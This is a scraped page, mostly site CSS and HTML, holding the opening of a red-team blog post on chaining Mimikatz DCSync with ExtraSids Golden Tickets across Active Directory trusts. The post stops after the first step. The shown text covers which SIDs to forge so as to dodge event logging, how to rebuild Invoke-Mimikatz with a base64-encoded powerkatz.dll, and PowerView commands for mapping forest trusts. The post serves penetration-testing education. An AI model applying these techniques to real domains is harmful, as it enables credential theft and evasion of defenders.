.ast-desktop-header-content .astra-menu-animation-fade > .menu-item > .sub-menu,.ast-desktop .ast-desktop-header-content .astra-menu-animation-fade > .menu-item .menu-item > .sub-menu {opacity: 1;visibility: visible;}.ast-hfb-header.ast-default-menu-enable.ast-header-break-point .ast-mobile-header-wrap .ast-mobile-header-content .main-header-bar-navigation {width: unset;margin: unset;}.ast-mobile-header-content.content-align-flex-end .main-header-bar-navigation .menu-item-has-children > .ast-menu-toggle,.ast-desktop-header-content.content-align-flex-end .main-header-bar-navigation .menu-item-has-children > .ast-menu-toggle {left: calc( 20px - 0.907em);}.ast-mobile-header-content .ast-search-menu-icon,.ast-mobile-header-content .ast-search-menu-icon.slide-search,.ast-desktop-header-content .ast-search-menu-icon,.ast-desktop-header-content .ast-search-menu-icon.slide-search {width: 100%;position: relative;display: block;right: auto;transform: none;}.ast-mobile-header-content .ast-search-menu-icon.slide-search .search-form,.ast-mobile-header-content .ast-search-menu-icon .search-form,.ast-desktop-header-content .ast-search-menu-icon.slide-search .search-form,.ast-desktop-header-content .ast-search-menu-icon .search-form {right: 0;visibility: visible;opacity: 1;position: relative;top: auto;transform: none;padding: 0;display: block;overflow: hidden;}.ast-mobile-header-content .ast-search-menu-icon.ast-inline-search .search-field,.ast-mobile-header-content .ast-search-menu-icon .search-field,.ast-desktop-header-content .ast-search-menu-icon.ast-inline-search .search-field,.ast-desktop-header-content .ast-search-menu-icon .search-field {width: 100%;padding-right: 5.5em;}.ast-mobile-header-content .ast-search-menu-icon .search-submit,.ast-desktop-header-content .ast-search-menu-icon .search-submit {display: block;position: absolute;height: 100%;top: 0;right: 0;padding: 0 1em;border-radius: 0;}.ast-hfb-header.ast-default-menu-enable.ast-header-break-point .ast-mobile-header-wrap .ast-mobile-header-content .main-header-bar-navigation ul .sub-menu .menu-link {padding-left: 30px;}.ast-hfb-header.ast-default-menu-enable.ast-header-break-point .ast-mobile-header-wrap .ast-mobile-header-content .main-header-bar-navigation .sub-menu .menu-item .menu-item .menu-link {padding-left: 40px;}.ast-mobile-popup-drawer.active .ast-mobile-popup-inner{background-color:#ffffff;;}.ast-mobile-header-wrap .ast-mobile-header-content, .ast-desktop-header-content{background-color:#ffffff;;}.ast-mobile-popup-content > *, .ast-mobile-header-content > *, .ast-desktop-popup-content > *, .ast-desktop-header-content > *{padding-top:0;padding-bottom:0;}.content-align-flex-start .ast-builder-layout-element{justify-content:flex-start;}.content-align-flex-start .main-header-menu{text-align:left;}.ast-mobile-popup-drawer.active .ast-mobile-popup-drawer.active .menu-toggle-close{color:#3a3a3a;}.ast-mobile-header-wrap .ast-primary-header-bar,.ast-primary-header-bar .site-primary-header-wrap{min-height:70px;}.ast-desktop .ast-primary-header-bar .main-header-menu > .menu-item{line-height:70px;}@media (max-width:921px){#masthead .ast-mobile-header-wrap .ast-above-header-bar,#masthead .ast-mobile-header-wrap .ast-primary-header-bar,#masthead .ast-mobile-header-wrap .ast-below-header-bar{padding-left:20px;padding-right:20px;}}.ast-header-break-point .ast-primary-header-bar{border-bottom-width:1px;border-bottom-color:#eaeaea;border-bottom-style:solid;}@media (min-width:922px){.ast-primary-header-bar{border-bottom-width:1px;border-bottom-color:#eaeaea;border-bottom-style:solid;}}.ast-primary-header-bar{background-color:#191919;;background-image:none;;}.ast-primary-header-bar{display:block;}@media (max-width:921px){.ast-header-break-point .ast-primary-header-bar{display:grid;}}@media (max-width:544px){.ast-header-break-point .ast-primary-header-bar{display:grid;}}[data-section="section-header-mobile-trigger"] .ast-button-wrap .ast-mobile-menu-trigger-minimal{color:#33ccda;border:none;background:transparent;}[data-section="section-header-mobile-trigger"] .ast-button-wrap .mobile-menu-toggle-icon .ast-mobile-svg{width:20px;height:20px;fill:#33ccda;}[data-section="section-header-mobile-trigger"] .ast-button-wrap .mobile-menu-wrap .mobile-menu{color:#33ccda;}.ast-builder-menu-mobile .main-navigation .menu-item > .menu-link{font-family:inherit;font-weight:inherit;}.ast-builder-menu-mobile .main-navigation .menu-item.menu-item-has-children > .ast-menu-toggle{top:0;}.ast-builder-menu-mobile .main-navigation .menu-item-has-children > .menu-link:after{content:unset;}.ast-hfb-header .ast-builder-menu-mobile .main-header-menu, .ast-hfb-header .ast-builder-menu-mobile .main-navigation .menu-item .menu-link, .ast-hfb-header .ast-builder-menu-mobile .main-navigation .menu-item .sub-menu .menu-link{border-style:none;}.ast-builder-menu-mobile .main-navigation .menu-item.menu-item-has-children > .ast-menu-toggle{top:0;}@media (max-width:921px){.ast-builder-menu-mobile .main-navigation .menu-item.menu-item-has-children > .ast-menu-toggle{top:0;}.ast-builder-menu-mobile .main-navigation .menu-item-has-children > .menu-link:after{content:unset;}}@media (max-width:544px){.ast-builder-menu-mobile .main-navigation .menu-item.menu-item-has-children > .ast-menu-toggle{top:0;}}.ast-builder-menu-mobile .main-navigation{display:block;}@media (max-width:921px){.ast-header-break-point .ast-builder-menu-mobile .main-navigation{display:block;}}@media (max-width:544px){.ast-header-break-point .ast-builder-menu-mobile .main-navigation{display:block;}}.footer-widget-area[data-section="section-footer-menu"] .astra-footer-horizontal-menu{justify-content:center;}.footer-widget-area[data-section="section-footer-menu"] .astra-footer-vertical-menu .menu-item{align-items:center;}@media (max-width:921px){.footer-widget-area[data-section="section-footer-menu"] .astra-footer-tablet-horizontal-menu{justify-content:center;}.footer-widget-area[data-section="section-footer-menu"] .astra-footer-tablet-vertical-menu{display:grid;}.footer-widget-area[data-section="section-footer-menu"] .astra-footer-tablet-vertical-menu .menu-item{align-items:center;}#astra-footer-menu .menu-item > a{padding-left:20px;padding-right:20px;}}@media (max-width:544px){.footer-widget-area[data-section="section-footer-menu"] .astra-footer-mobile-horizontal-menu{justify-content:center;}.footer-widget-area[data-section="section-footer-menu"] .astra-footer-mobile-vertical-menu{display:grid;}.footer-widget-area[data-section="section-footer-menu"] .astra-footer-mobile-vertical-menu .menu-item{align-items:center;}}.footer-widget-area[data-section="section-footer-menu"]{display:block;}@media (max-width:921px){.ast-header-break-point .footer-widget-area[data-section="section-footer-menu"]{display:block;}}@media (max-width:544px){.ast-header-break-point .footer-widget-area[data-section="section-footer-menu"]{display:block;}}.comment-reply-title{font-size:24px;font-size:1.6rem;}.ast-comment-meta{line-height:1.666666667;color:#1d798b;font-size:12px;font-size:0.8rem;}.ast-comment-list #cancel-comment-reply-link{font-size:15px;font-size:1rem;}.comments-title {padding: 2em 0;}.comments-title {font-weight: normal;word-wrap: break-word;}.ast-comment-list {margin: 0;word-wrap: break-word;padding-bottom: 0.5em;list-style: none;}.ast-comment-list li {list-style: none;}.ast-comment-list .ast-comment-edit-reply-wrap {-js-display: flex;display: flex;justify-content: flex-end;}.ast-comment-list .ast-edit-link {flex: 1;}.ast-comment-list .comment-awaiting-moderation {margin-bottom: 0;}.ast-comment {padding: 1em 0;}.ast-comment-info img {border-radius: 50%;}.ast-comment-cite-wrap cite {font-style: normal;}.comment-reply-title {padding-top: 1em;font-weight: normal;line-height: 1.65;}.ast-comment-meta {margin-bottom: 0.5em;}.comments-area {border-top: 1px solid #eeeeee;margin-top: 2em;}.comments-area .comment-form-comment {width: 100%;border: none;margin: 0;padding: 0;}.comments-area .comment-notes,.comments-area .comment-textarea,.comments-area .form-allowed-tags {margin-bottom: 1.5em;}.comments-area .form-submit {margin-bottom: 0;}.comments-area textarea#comment,.comments-area .ast-comment-formwrap input[type="text"] {width: 100%;border-radius: 0;vertical-align: middle;margin-bottom: 10px;}.comments-area .no-comments {margin-top: 0.5em;margin-bottom: 0.5em;}.comments-area p.logged-in-as {margin-bottom: 1em;}.ast-separate-container .comments-title {background-color: #fff;padding: 1.2em 3.99em 0;}.ast-separate-container .comments-area {border-top: 0;}.ast-separate-container .ast-comment-list {padding-bottom: 0;}.ast-separate-container .ast-comment-list li {background-color: #fff;}.ast-separate-container .ast-comment-list li.depth-1 {padding: 4em 6.67em;margin-bottom: 2em;}@media (max-width: 1200px) {.ast-separate-container .ast-comment-list li.depth-1 {padding: 3em 3.34em;}}.ast-separate-container .ast-comment-list li.depth-1 .children li {padding-bottom: 0;padding-top: 0;margin-bottom: 0;}.ast-separate-container .ast-comment-list li.depth-1 .ast-comment,.ast-separate-container .ast-comment-list li.depth-2 .ast-comment {border-bottom: 0;}.ast-separate-container .ast-comment-list .comment-respond {padding-top: 0;padding-bottom: 1em;background-color: transparent;}.ast-separate-container .ast-comment-list .pingback p {margin-bottom: 0;}.ast-separate-container .ast-comment-list .bypostauthor {padding: 2em;margin-bottom: 1em;}.ast-separate-container .ast-comment-list .bypostauthor li {background: transparent;margin-bottom: 0;padding: 0 0 0 2em;}.ast-separate-container .comment-respond {background-color: #fff;padding: 4em 6.67em;border-bottom: 0;}@media (max-width: 1200px) {.ast-separate-container .comment-respond {padding: 3em 2.34em;}}.ast-separate-container .comment-reply-title {padding-top: 0;}.ast-comment-list .children {margin-left: 2em;}@media (max-width: 992px) {.ast-comment-list .children {margin-left: 1em;}}.ast-comment-list #cancel-comment-reply-link {white-space: nowrap;font-size: 15px;font-size: 1rem;margin-left: 1em;}.ast-comment-info {display: flex;position: relative;}.ast-comment-meta {justify-content: right;padding: 0 3.4em 1.60em;}.ast-comment-time .timendate{margin-right: 0.5em;}.comments-area #wp-comment-cookies-consent {margin-right: 10px;}.ast-page-builder-template .comments-area {padding-left: 20px;padding-right: 20px;margin-top: 2em;margin-bottom: 2em;}.ast-separate-container .ast-comment-list .bypostauthor .bypostauthor {background: transparent;margin-bottom: 0;padding-right: 0;padding-bottom: 0;padding-top: 0;}@media (min-width:922px){.ast-separate-container .ast-comment-list li .comment-respond{padding-left:2.66666em;padding-right:2.66666em;}}@media (max-width:544px){.ast-separate-container .ast-comment-list li.depth-1{padding:1.5em 1em;margin-bottom:1.5em;}.ast-separate-container .ast-comment-list .bypostauthor{padding:.5em;}.ast-separate-container .comment-respond{padding:1.5em 1em;}}@media (max-width:921px){.ast-comment-avatar-wrap img{max-width:2.5em;}.comments-area{margin-top:1.5em;}.ast-separate-container .comments-title{padding:1.43em 1.48em;}.ast-comment-meta{padding:0 1.8888em 1.3333em;}.ast-separate-container .ast-comment-list li.depth-1{padding:1.5em 2.14em;}.ast-separate-container .comment-respond{padding:2em 2.14em;}}
</style>
<link rel='stylesheet' id='astra-google-fonts-css'  href='//fonts.googleapis.com/css?family=Roboto%3A400%2C%7COxanium%3A400%2C&#038;display=fallback&#038;ver=3.4.2' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='http://www.harmj0y.net/blog/wp-includes/css/dist/block-library/style.min.css?ver=5.7.2' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<link rel='stylesheet' id='tablepress-default-css'  href='http://www.harmj0y.net/blog/wp-content/plugins/tablepress/css/default.min.css?ver=1.13' media='all' />
<link rel='stylesheet' id='jetpack_css-css'  href='http://www.harmj0y.net/blog/wp-content/plugins/jetpack/css/jetpack.css?ver=9.7' media='all' />
<script src='http://www.harmj0y.net/blog/wp-includes/js/jquery/jquery.min.js?ver=3.5.1' id='jquery-core-js'></script>
<script src='http://www.harmj0y.net/blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script id='crayon_js-js-extra'>
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"http:\/\/www.harmj0y.net\/blog\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
</script>
<script src='http://www.harmj0y.net/blog/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta' id='crayon_js-js'></script>
<!--[if IE]>
<script src='http://www.harmj0y.net/blog/wp-content/themes/astra/assets/js/minified/flexibility.min.js?ver=3.4.2' id='astra-flexibility-js'></script>
<script id='astra-flexibility-js-after'>
flexibility(document.documentElement);
</script>
<![endif]-->
<link rel="https://api.w.org/" href="http://www.harmj0y.net/blog/wp-json/" /><link rel="alternate" type="application/json" href="http://www.harmj0y.net/blog/wp-json/wp/v2/posts/1660" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.harmj0y.net/blog/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.harmj0y.net/blog/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7.2" />
<link rel="canonical" href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/" />
<link rel='shortlink' href='https://wp.me/p4qDDn-qM' />
<link rel="alternate" type="application/json+oembed" href="http://www.harmj0y.net/blog/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.harmj0y.net%2Fblog%2Fredteaming%2Fmimikatz-and-dcsync-and-extrasids-oh-my%2F" />
<link rel="alternate" type="text/xml+oembed" href="http://www.harmj0y.net/blog/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.harmj0y.net%2Fblog%2Fredteaming%2Fmimikatz-and-dcsync-and-extrasids-oh-my%2F&#038;format=xml" />
<link rel="pingback" href="http://www.harmj0y.net/blog/xmlrpc.php">

<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Mimikatz and DCSync and ExtraSids, Oh My" />
<meta property="og:url" content="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/" />
<meta property="og:description" content="Edit: Benjamin reached out and corrected me on a few points, which I&#8217;ve updated throughout the post. Importantly, with the ExtraSids (/sids) for the injected Golden Ticket, you need to specifâ€¦" />
<meta property="article:published_time" content="2015-09-22T14:44:52+00:00" />
<meta property="article:modified_time" content="2015-11-05T13:47:29+00:00" />
<meta property="og:site_name" content="harmj0y" />
<meta property="og:image" content="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/testlab_domain.png" />
<meta property="og:image:width" content="720" />
<meta property="og:image:height" content="540" />
<meta name="twitter:text:title" content="Mimikatz and DCSync and ExtraSids, Oh My" />
<meta name="twitter:image" content="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/testlab_domain.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="http://www.harmj0y.net/blog/wp-content/uploads/2021/05/cropped-Favicon-1-32x32.png" sizes="32x32" />
<link rel="icon" href="http://www.harmj0y.net/blog/wp-content/uploads/2021/05/cropped-Favicon-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="http://www.harmj0y.net/blog/wp-content/uploads/2021/05/cropped-Favicon-1-180x180.png" />
<meta name="msapplication-TileImage" content="http://www.harmj0y.net/blog/wp-content/uploads/2021/05/cropped-Favicon-1-270x270.png" />
			<style type="text/css" id="wp-custom-css">
				.btn {
  text-decoration: none;
	font-size: 18px;
	padding: 1rem 3rem;
	color: #ffffff;
	text-transform:uppercase;
  border: 1px solid rgb(146, 148, 248);
  position: relative;
  overflow: hidden;
	display: fixed;
  justify-content: center;
  align-items: center;
}

.btn:hover {
  box-shadow: 1px 1px 25px 10px rgba(146, 148, 248, 0.4);
}

.btn:before {
  content: "";
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  transition: all 650ms;
}

.btn:hover:before {
  left: 100%;
}
			</style>
		</head>

<body itemtype='https://schema.org/Blog' itemscope='itemscope' class="post-template-default single single-post postid-1660 single-format-standard wp-custom-logo ast-blog-single-style-1 ast-single-post ast-inherit-site-logo-transparent ast-hfb-header ast-desktop ast-separate-container ast-right-sidebar astra-3.4.2 ast-normal-title-enabled elementor-default elementor-kit-5017">
<div 
class="hfeed site" id="page">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
			<header
		class="site-header header-main-layout-1 ast-primary-menu-enabled ast-logo-title-inline ast-hide-custom-menu-mobile ast-builder-menu-toggle-icon ast-mobile-header-inline" id="masthead" itemtype="https://schema.org/WPHeader" itemscope="itemscope" itemid="#masthead"		>
			<div id="ast-desktop-header" data-toggle-type="dropdown">
		<div class="ast-main-header-wrap main-header-bar-wrap ">
		<div class="ast-primary-header-bar ast-primary-header main-header-bar site-header-focus-item" data-section="section-primary-header-builder">
						<div class="site-primary-header-wrap ast-builder-grid-row-container site-header-focus-item ast-container" data-section="section-primary-header-builder">
				<div class="ast-builder-grid-row ast-builder-grid-row-has-sides ast-builder-grid-row-no-center">
											<div class="site-header-primary-section-left site-header-section ast-flex site-header-section-left">
									<div class="ast-builder-layout-element ast-flex site-header-focus-item" data-section="title_tagline">
											<div
				class="site-branding ast-site-identity" itemtype="https://schema.org/Organization" itemscope="itemscope"				>
					<span class="site-logo-img"><a href="http://www.harmj0y.net/blog/" class="custom-logo-link" rel="home"><img width="120" height="38" src="http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union-120x38.png" class="custom-logo" alt="harmj0y logo" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union-120x38.png 120w, http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union-300x95.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union-768x242.png 768w, http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union.png 904w" sizes="(max-width: 120px) 100vw, 120px" /></a></span>				</div>
			<!-- .site-branding -->
					</div>
								</div>
																									<div class="site-header-primary-section-right site-header-section ast-flex ast-grid-right-section">
										<div class="ast-builder-menu-1 ast-builder-menu ast-flex ast-builder-menu-1-focus-item ast-builder-layout-element site-header-focus-item" data-section="section-hb-menu-1">
			<div class="ast-main-header-bar-alignment"><div class="main-header-bar-navigation ast-flex-1"><nav class="site-navigation" id="site-navigation" itemtype="https://schema.org/SiteNavigationElement" itemscope="itemscope" class="ast-flex-grow-1 navigation-accessibility" aria-label="Site Navigation"><div id="ast-hf-menu-1" class="main-navigation ast-inline-flex"><ul class="main-header-menu ast-nav-menu ast-flex  submenu-with-border ast-menu-hover-style-overline  stack-on-mobile"><li class="page_item page-item-12 menu-item"><a href="http://www.harmj0y.net/blog/about/" class="menu-link">About</a></li><li class="page_item page-item-20 menu-item"><a href="http://www.harmj0y.net/blog/presentations/" class="menu-link">Presentations</a></li><li class="page_item page-item-10 menu-item"><a href="http://www.harmj0y.net/blog/projects/" class="menu-link">Projects</a></li></ul></div></nav></div></div>		</div>
									</div>
												</div>
					</div>
								</div>
			</div>
		<div class="ast-desktop-header-content content-align-flex-start ">
			</div>
</div> <!-- Main Header Bar Wrap -->
<div id="ast-mobile-header" class="ast-mobile-header-wrap " data-type="dropdown">
		<div class="ast-main-header-wrap main-header-bar-wrap" >
		<div class="ast-primary-header-bar ast-primary-header main-header-bar site-primary-header-wrap site-header-focus-item ast-builder-grid-row-layout-default ast-builder-grid-row-tablet-layout-default ast-builder-grid-row-mobile-layout-default" data-section="section-primary-header-builder">
									<div class="ast-builder-grid-row ast-builder-grid-row-has-sides ast-builder-grid-row-no-center">
													<div class="site-header-primary-section-left site-header-section ast-flex site-header-section-left">
										<div class="ast-builder-layout-element ast-flex site-header-focus-item" data-section="title_tagline">
											<div
				class="site-branding ast-site-identity" itemtype="https://schema.org/Organization" itemscope="itemscope"				>
					<span class="site-logo-img"><a href="http://www.harmj0y.net/blog/" class="custom-logo-link" rel="home"><img width="120" height="38" src="http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union-120x38.png" class="custom-logo" alt="harmj0y logo" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union-120x38.png 120w, http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union-300x95.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union-768x242.png 768w, http://www.harmj0y.net/blog/wp-content/uploads/2021/05/Union.png 904w" sizes="(max-width: 120px) 100vw, 120px" /></a></span>				</div>
			<!-- .site-branding -->
					</div>
									</div>
																									<div class="site-header-primary-section-right site-header-section ast-flex ast-grid-right-section">
										<div class="ast-builder-layout-element ast-flex site-header-focus-item" data-section="section-header-mobile-trigger">
						<div class="ast-button-wrap">
				<button type="button" class="menu-toggle main-header-menu-toggle ast-mobile-menu-trigger-minimal"   aria-expanded="false">
					<span class="screen-reader-text">Main Menu</span>
					<span class="mobile-menu-toggle-icon">
						<span class="ahfb-svg-iconset ast-inline-flex svg-baseline"><svg role='img' class='ast-mobile-svg ast-menu-svg' fill='currentColor' version='1.1' xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'><path d='M3 13h18c0.552 0 1-0.448 1-1s-0.448-1-1-1h-18c-0.552 0-1 0.448-1 1s0.448 1 1 1zM3 7h18c0.552 0 1-0.448 1-1s-0.448-1-1-1h-18c-0.552 0-1 0.448-1 1s0.448 1 1 1zM3 19h18c0.552 0 1-0.448 1-1s-0.448-1-1-1h-18c-0.552 0-1 0.448-1 1s0.448 1 1 1z'></path></svg></span><span class="ahfb-svg-iconset ast-inline-flex svg-baseline"><svg class='ast-mobile-svg ast-close-svg' fill='currentColor' version='1.1' xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'><path d='M5.293 6.707l5.293 5.293-5.293 5.293c-0.391 0.391-0.391 1.024 0 1.414s1.024 0.391 1.414 0l5.293-5.293 5.293 5.293c0.391 0.391 1.024 0.391 1.414 0s0.391-1.024 0-1.414l-5.293-5.293 5.293-5.293c0.391-0.391 0.391-1.024 0-1.414s-1.024-0.391-1.414 0l-5.293 5.293-5.293-5.293c-0.391-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414z'></path></svg></span>					</span>
									</button>
			</div>
					</div>
									</div>
											</div>
						</div>
	</div>
		<div class="ast-mobile-header-content content-align-flex-start ">
				<div class="ast-builder-menu-mobile ast-builder-menu ast-builder-menu-mobile-focus-item ast-builder-layout-element site-header-focus-item" data-section="section-header-mobile-menu">
			<div class="ast-main-header-bar-alignment"><div class="main-header-bar-navigation"><nav class="site-navigation" id="site-navigation" itemtype="https://schema.org/SiteNavigationElement" itemscope="itemscope" class="ast-flex-grow-1 navigation-accessibility" aria-label="Site Navigation"><div id="ast-hf-mobile-menu" class="main-navigation"><ul class="main-header-menu ast-nav-menu ast-flex  submenu-with-border astra-menu-animation-fade  stack-on-mobile"><li class="page_item page-item-12 menu-item"><a href="http://www.harmj0y.net/blog/about/" class="menu-link">About</a></li><li class="page_item page-item-20 menu-item"><a href="http://www.harmj0y.net/blog/presentations/" class="menu-link">Presentations</a></li><li class="page_item page-item-10 menu-item"><a href="http://www.harmj0y.net/blog/projects/" class="menu-link">Projects</a></li></ul></div></nav></div></div>		</div>
			</div>
</div>
		</header><!-- #masthead -->
			<div id="content" class="site-content">
		<div class="ast-container">
		

	<div id="primary" class="content-area primary">

		
					<main id="main" class="site-main">
				

<article
class="post-1660 post type-post status-publish format-standard hentry category-redteaming tag-domain-trusts tag-mimikatz ast-article-single" id="post-1660" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div class="ast-post-format- ast-no-thumb single-layout-1">

	
	<header class="entry-header ast-no-thumbnail">

		
				<div class="ast-single-post-order">
			<h1 class="entry-title" itemprop="headline">Mimikatz and DCSync and ExtraSids, Oh My</h1><div class="entry-meta">			<span class="comments-link">
				<a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/#comments">9 Comments</a>			</span>

			 / <span class="cat-links"><a href="http://www.harmj0y.net/blog/category/redteaming/" rel="category tag">Red Teaming</a></span> / By <span class="posted-by vcard author" itemtype="https://schema.org/Person" itemscope="itemscope" itemprop="author">			<a title="View all posts by harmj0y" 
				href="http://www.harmj0y.net/blog/author/harmj0y/" rel="author"
				class="url fn n" itemprop="url"				>
				<span 
				class="author-name" itemprop="name"				>harmj0y</span>
			</a>
		</span>

		</div>		</div>
		
		
	</header><!-- .entry-header -->

	
	<div class="entry-content clear" 
	itemprop="text"	>

		
		<p><strong>Edit: </strong><em>Benjamin reached out and corrected me on a few points, which I&#8217;ve updated throughout the post. Importantly, with the ExtraSids (/sids) for the injected Golden Ticket, you need to specifyÂ S-1-5-21domain-516 (&#8220;Domain Controllers&#8221;) andÂ S-1-5-9 (&#8220;Enterprise Domain Controllers&#8221;), as well as the SECONDARY$ domain controller SID in order to properly slip by some of the event logging.</em></p>
<p><a href="https://twitter.com/gentilkiwi">Benjamin Delpy</a> is constantly adding new features to Mimikatz. In June, he added the ability to include <a href="https://twitter.com/gentilkiwi/status/615289503029305345">ExtraSids in golden tickets</a>. This was built in coordination with <a href="https://twitter.com/pyrotek3">Sean Metcalf</a>&#8216;s work <a href="https://adsecurity.org/?p=1640">on theÂ subject</a>, and something <a href="http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/">I talked about here</a>.</p>
<p>Benjamin andÂ <a href="mailto:vincent.letoux@gmail.com">Vincent Le Toux</a> also <a href="https://twitter.com/gentilkiwi/status/630888793600606208?lang=en">recently added</a> the ability to abuse theÂ <a href="https://msdn.microsoft.com/en-us/library/cc228086.aspx">MS-DRSR protocol</a>Â for domain controller replication, in order to recover hashes from a DCÂ without code execution. I touched on this briefly in the post detailing <a href="http://www.harmj0y.net/blog/empire/empire-1-2/">Empire&#8217;s v1.2 release</a>Â (and in a <a href="https://www.youtube.com/watch?v=ns7M6zjWDrs">demonstration video</a>)Â but I wanted to revisit the subject and show how these two new features can be combined into a single attack chain. If you&#8217;re interested in Active Directory attacks, be sure to check out Sean&#8217;s &#8220;<a href="https://www.derbycon.com/derbycon-2015-schedule-and-abstract/">Red vs. Blue: Modern Active Directory Attacks &amp; Defense</a>&#8221; talk at Derbycon, Friday at 3:00pm. I hear he&#8217;ll be droppingÂ some interesting information applicable to this post :)</p>
<p><strong>Sidenote:</strong> if you want to compile the newest version of Mimikatz for PowerSploit&#8217;s <a href="https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a>, just grab <a href="https://github.com/gentilkiwi/mimikatz">Benjamin&#8217;s source code</a>, open it up in Visual Studio, select the &#8220;Second_Release_PowerShell&#8221; target option and compile for both Win32 and x64.</p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/01/powerkatz.png"><img loading="lazy" class="aligncenter wp-image-957" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/01/powerkatz.png" alt="powerkatz" width="565" height="157" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/01/powerkatz.png 741w, http://www.harmj0y.net/blog/wp-content/uploads/2015/01/powerkatz-300x83.png 300w" sizes="(max-width: 565px) 100vw, 565px" /></a></p>
<p>Then transform the resulting powerkatz.dlls to a base64 string usingÂ <strong>base64 -w 0 powerkatz.dll</strong>Â in Linux.Â You can now replace theÂ $PEBytes32 andÂ $PEBytes64 strings at the bottom of Invoke-Mimikatz.ps1. Empire keeps a <a href="https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1">separatelyÂ updated</a> version of Invoke-Mimikatz with a few additional tweaks.</p>
<h2>Scenario</h2>
<p>Let&#8217;s say you&#8217;re operating in the following example network:</p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/testlab_domain.png"><img loading="lazy" class="aligncenter size-full wp-image-1728" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/testlab_domain.png" alt="testlab_domain" width="720" height="540" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/testlab_domain.png 720w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/testlab_domain-300x225.png 300w" sizes="(max-width: 720px) 100vw, 720px" /></a></p>
<p>YouÂ land on a machine in the <strong>dev.testlab.local</strong>Â domain, and there is tight network filtering from here toÂ the others in the forest; i.e. you can talk to your SECONDARY.dev.testlab.local domain controller but to fewÂ machines in other domains. We&#8217;ve seen this setup a few times in the field, where an organization keeps the forest root relatively &#8216;sparse&#8217; and keeps less trusted subsidiaries/groups in a segmented domain.</p>
<p>After some <a href="http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/">user-hunting</a>Â and some <a href="http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/">lateral spread</a>, you end up on workstation WINDOWS3 with domain administrator credentials forÂ <strong>dev.testlab.local</strong>. From this point historically, you would often compromise/exfilÂ the NTDS.dit of one of DEV&#8217;s domain controllers, and then start the <a href="http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/">process of hopping</a> through the <a href="http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/">trust mesh</a>. While we were usually successful in cross-domain compromise, this process often took a good a good bit of time and effort. Let&#8217;s see how we can use some of these new school techniques to speed up the process.</p>
<h2>Step 1:Â Enumerate the Forest</h2>
<p>First let&#8217;s do a bit of network and domain situationalf awareness. We can enumerate the current trusts in the forest in a few different ways- my preference is to use <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView 2.0</a> and run <strong>Get-NetForestDomainÂ </strong>or <strong>Invoke-MapDomainTrust -LDAP</strong> to recursively map all trust relationships in the forest:</p>
